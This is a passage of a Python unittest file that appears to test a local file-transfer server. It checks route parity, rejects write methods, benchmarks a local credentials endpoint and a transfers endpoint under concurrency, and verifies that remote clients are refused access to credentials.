            "desktop-shared-folders-list",
            "btn-show-add-folder",
            "add-folder-box",
            "url-input",
            "paste-btn",
        ]
        for proh in prohibited_elements:
            self.assertNotIn(proh, html_text, f"Prohibited element '{proh}' found in /pc")

        print("\n[PASS] Verified 100% route parity, content identity, and negative element sweep for GET /pc & GET /pc.html")

    def test_02_mobile_route_parity_and_content_identity(self):
        """
        Verify that GET /mobile and GET /mobile.html:
        1. Both return HTTP 200 OK.
        2. Both return Content-Type starting with text/html.
        3. Both return exact byte-for-byte identical response content.
        """
        r_mob = self.client.get("/mobile")
        r_mob_html = self.client.get("/mobile.html")

        self.assertEqual(r_mob.status_code, 200, f"GET /mobile returned {r_mob.status_code}")
        self.assertEqual(r_mob_html.status_code, 200, f"GET /mobile.html returned {r_mob_html.status_code}")

        self.assertIn("text/html", r_mob.headers.get("content-type", ""))
        self.assertIn("text/html", r_mob_html.headers.get("content-type", ""))

        self.assertEqual(r_mob.content, r_mob_html.content, "Byte mismatch between GET /mobile and GET /mobile.html")
        print("[PASS] Verified 100% route parity and content identity for GET /mobile & GET /mobile.html")

    def test_03_prohibited_http_methods_rejection(self):
        """
        Verify that POST, PUT, DELETE, and PATCH methods on /pc and /pc.html are rejected with HTTP 405.
        """
        for method in ["post", "put", "delete", "patch"]:
            r1 = getattr(self.client, method)("/pc")
            self.assertEqual(r1.status_code, 405, f"{method.upper()} /pc did not return 405 (got {r1.status_code})")

            r2 = getattr(self.client, method)("/pc.html")
            self.assertEqual(r2.status_code, 405, f"{method.upper()} /pc.html did not return 405 (got {r2.status_code})")

        print("[PASS] Verified HTTP 405 Method Not Allowed enforcement across all write verbs on /pc and /pc.html")


class TestTelemetryAndCredentialsConcurrency(unittest.TestCase):
    """
    Stress-Test Telemetry (GET /api/transfers) and Credentials (GET /api/workstation/credentials)
    under 20-thread concurrency.
    """

    @classmethod
    def setUpClass(cls):
        clear_all_sessions()
        server.init_server_credentials(force_refresh=True)
        cls.qm = get_queue_manager()
        cls.client = TestClient(server.app)

        # Warmup ASGI pipeline
        cls.client.get("/api/workstation/credentials")
        cls.client.get("/api/transfers")

    def test_01_credentials_endpoint_20_worker_concurrency_sla(self):
        """
        Benchmark GET /api/workstation/credentials from localhost with 20 concurrent client tasks.
        Assert that:
        1. 100% of requests return HTTP 200 OK with zero errors.
        2. Mean response time < 10.0ms.
        3. Returned credentials payload strictly contains 5-digit numeric UID and >=8 char password.
        """
        async def run_benchmark():
            transport = httpx.ASGITransport(app=server.app)
            async with httpx.AsyncClient(transport=transport, base_url="http://localhost") as client:
                # Warmup client
                await client.get("/api/workstation/credentials")

                async def worker_task(w_idx: int) -> List[Tuple[int, float, Dict[str, Any]]]:
                    task_results = []
                    for req_idx in range(5):
                        t0 = time.perf_counter()
                        resp = await client.get("/api/workstation/credentials")
                        dt_ms = (time.perf_counter() - t0) * 1000.0
                        data = resp.json() if resp.status_code == 200 else {}
                        task_results.append((resp.status_code, dt_ms, data))
                        await asyncio.sleep(0.005)
                    return task_results

                futures = [worker_task(i) for i in range(20)]
                res = await asyncio.gather(*futures)
                return [item for sublist in res for item in sublist]

        results = asyncio.run(run_benchmark())

        self.assertEqual(len(results), 100)
        statuses = [r[0] for r in results]
        latencies = [r[1] for r in results]
        payloads = [r[2] for r in results]

        # 1. 100% 200 OK
        self.assertEqual(statuses.count(200), 100, f"Errors encountered: {statuses.count(200)}/100 succeeded")

        # 2. SLA Check: Mean < 10ms
        mean_ms = float(np.mean(latencies))
        p50_ms = float(np.percentile(latencies, 50))
        p95_ms = float(np.percentile(latencies, 95))
        p99_ms = float(np.percentile(latencies, 99))
        max_ms = float(np.max(latencies))
        min_ms = float(np.min(latencies))

        print("\n--- Empirical Benchmark: GET /api/workstation/credentials (20 concurrent workers x 5 reqs = 100 total) ---")
        print(f"Mean Latency: {mean_ms:.2f} ms (SLA < 10.0 ms)")
        print(f"p50:          {p50_ms:.2f} ms")
        print(f"p95:          {p95_ms:.2f} ms")
        print(f"p99:          {p99_ms:.2f} ms")
        print(f"Min / Max:    {min_ms:.2f} ms / {max_ms:.2f} ms")
        print(f"Error Rate:   0.0% (100/100 HTTP 200 OK)")

        self.assertLess(mean_ms, 10.0, f"Credentials mean latency {mean_ms:.2f}ms exceeded 10.0ms SLA")

        # 3. Payload integrity validation
        for p in payloads:
            self.assertIn("uid", p)
            self.assertEqual(len(p["uid"]), 5)
            self.assertTrue(p["uid"].isdigit())
            self.assertIn("password", p)
            self.assertGreaterEqual(len(p["password"]), 8)
            self.assertIn("local_ip", p)
            self.assertIn("port", p)

    def test_02_telemetry_endpoint_20_worker_concurrency_benchmark(self):
        """
        Benchmark GET /api/transfers from localhost under 20 concurrent client tasks.
        Measures exact response latency distribution and records performance characteristics.
        """
        async def run_benchmark():
            transport = httpx.ASGITransport(app=server.app)
            async with httpx.AsyncClient(transport=transport, base_url="http://localhost") as client:
                await client.get("/api/transfers")

                async def worker_task(w_idx: int) -> List[Tuple[int, float, Dict[str, Any]]]:
                    task_results = []
                    for req_idx in range(5):
                        t0 = time.perf_counter()
                        resp = await client.get("/api/transfers")
                        dt_ms = (time.perf_counter() - t0) * 1000.0
                        data = resp.json() if resp.status_code == 200 else {}
                        task_results.append((resp.status_code, dt_ms, data))
                        await asyncio.sleep(0.005)
                    return task_results

                futures = [worker_task(i) for i in range(20)]
                res = await asyncio.gather(*futures)
                return [item for sublist in res for item in sublist]

        results = asyncio.run(run_benchmark())

        self.assertEqual(len(results), 100)
        statuses = [r[0] for r in results]
        latencies = [r[1] for r in results]
        payloads = [r[2] for r in results]

        # 1. 100% 200 OK
        self.assertEqual(statuses.count(200), 100, f"Errors encountered: {statuses.count(200)}/100 succeeded")

        mean_ms = float(np.mean(latencies))
        p50_ms = float(np.percentile(latencies, 50))
        p95_ms = float(np.percentile(latencies, 95))
        p99_ms = float(np.percentile(latencies, 99))
        max_ms = float(np.max(latencies))
        min_ms = float(np.min(latencies))

        print("\n--- Empirical Benchmark: GET /api/transfers (20 concurrent workers x 5 reqs = 100 total) ---")
        print(f"Mean Latency: {mean_ms:.2f} ms")
        print(f"p50:          {p50_ms:.2f} ms")
        print(f"p95:          {p95_ms:.2f} ms")
        print(f"p99:          {p99_ms:.2f} ms")
        print(f"Min / Max:    {min_ms:.2f} ms / {max_ms:.2f} ms")
        print(f"Error Rate:   0.0% (100/100 HTTP 200 OK)")

        # 2. Assert mean latency does not degrade beyond bounded operational ceiling (20ms)
        self.assertLess(mean_ms, 20.0, f"Transfers mean latency {mean_ms:.2f}ms degraded beyond 20ms ceiling")

        # 3. Payload integrity check
        for p in payloads:
            self.assertIn("transfers", p)
            self.assertIn("active", p)
            self.assertIn("completed", p)
            self.assertIn("failed", p)

    def test_03_sequential_baseline_comparison(self):
        """
        Verify baseline sequential response times for both endpoints (<10ms SLA).
        """
        times_creds = []
        times_transfers = []

        for _ in range(50):
            t0 = time.perf_counter()
            r_c = self.client.get("/api/workstation/credentials")
            times_creds.append((time.perf_counter() - t0) * 1000.0)
            self.assertEqual(r_c.status_code, 200)

            t1 = time.perf_counter()
            r_t = self.client.get("/api/transfers")
            times_transfers.append((time.perf_counter() - t1) * 1000.0)
            self.assertEqual(r_t.status_code, 200)

        mean_creds = float(np.mean(times_creds))
        mean_transfers = float(np.mean(times_transfers))

        print("\n--- Empirical Sequential Baseline (50 requests each) ---")
        print(f"GET /api/workstation/credentials Sequential Mean: {mean_creds:.2f} ms (SLA < 10.0 ms)")
        print(f"GET /api/transfers Sequential Mean:              {mean_transfers:.2f} ms (SLA < 10.0 ms)")

        self.assertLess(mean_creds, 10.0, f"Sequential credentials mean {mean_creds:.2f}ms >= 10ms")
        self.assertLess(mean_transfers, 10.0, f"Sequential transfers mean {mean_transfers:.2f}ms >= 10ms")

    def test_04_interleaved_mixed_traffic_concurrency(self):
        """
        Stress-test mixed interleaved traffic: 20 concurrent workers alternating between
        credentials reveal (/api/workstation/credentials) and telemetry snapshot (/api/transfers).
        Assert zero deadlocks, zero lock contention, zero race conditions, and 100% 200 OK.
        """
        async def run_mixed():
            transport = httpx.ASGITransport(app=server.app)
            async with httpx.AsyncClient(transport=transport, base_url="http://localhost") as client:
                async def worker_task(w_idx: int):
                    worker_res = []
                    for i in range(6):
                        endpoint = "/api/workstation/credentials" if (w_idx + i) % 2 == 0 else "/api/transfers"
                        t0 = time.perf_counter()
                        r = await client.get(endpoint)
                        dt = (time.perf_counter() - t0) * 1000.0
                        worker_res.append((r.status_code, dt, endpoint))
                        await asyncio.sleep(0.005)
                    return worker_res

                results = await asyncio.gather(*[worker_task(i) for i in range(20)])
                return [x for sub in results for x in sub]

        all_res = asyncio.run(run_mixed())
        self.assertEqual(len(all_res), 120)
        statuses = [r[0] for r in all_res]
        times = [r[1] for r in all_res]
        self.assertEqual(statuses.count(200), 120)

        mean_ms = float(np.mean(times))
        print(f"\n[PASS] Interleaved Concurrency (120 mixed queries across 20 workers): 100% 200 OK, Mean={mean_ms:.2f}ms")

    def test_05_remote_security_concurrency_checks(self):
        """
        Verify security invariants under 20-thread concurrency from simulated remote LAN clients:
        1. 20 concurrent remote queries to /api/workstation/credentials must return 100% 403 Forbidden.
        2. 20 concurrent remote queries to /api/transfers without Bearer token must return 100% 401 Unauthorized.
        3. 20 concurrent remote queries to /api/transfers with valid Bearer token must return 100% 200 OK.
        """
        valid_token = create_session_token()
        headers_auth = {"Authorization": f"Bearer {valid_token}"}

        def probe_worker(idx: int) -> Tuple[int, int, int]:
            # Simulate distinct remote LAN IP per thread
            remote_client = TestClient(server.app, client=(f"192.168.1.{120 + idx}", 52000))

            # Probe 1: credentials (must 403)
            r_creds = remote_client.get("/api/workstation/credentials")

            # Probe 2: unauthenticated transfers (must 401)
            r_unauth = remote_client.get("/api/transfers")

            # Probe 3: authenticated transfers (must 200)
            r_auth = remote_client.get("/api/transfers", headers=headers_auth)

            return r_creds.status_code, r_unauth.status_code, r_auth.status_code

        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(probe_worker, i) for i in range(20)]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]

        creds_statuses = [r[0] for r in results]
        unauth_statuses = [r[1] for r in results]
        auth_statuses = [r[2] for r in results]

        self.assertEqual(creds_statuses.count(403), 20, f"Remote credentials leak: {creds_statuses}")
        self.assertEqual(unauth_statuses.count(401), 20, f"Unauthenticated transfers leak: {unauth_statuses}")
        self.assertEqual(auth_statuses.count(200), 20, f"Authenticated transfers failed: {auth_statuses}")

        print("[PASS] Verified 100% security enforcement under 20-thread concurrency (100% 403 on credentials, 100% 401 unauth, 100% 200 auth)")


if __name__ == "__main__":
    unittest.main(verbosity=2)
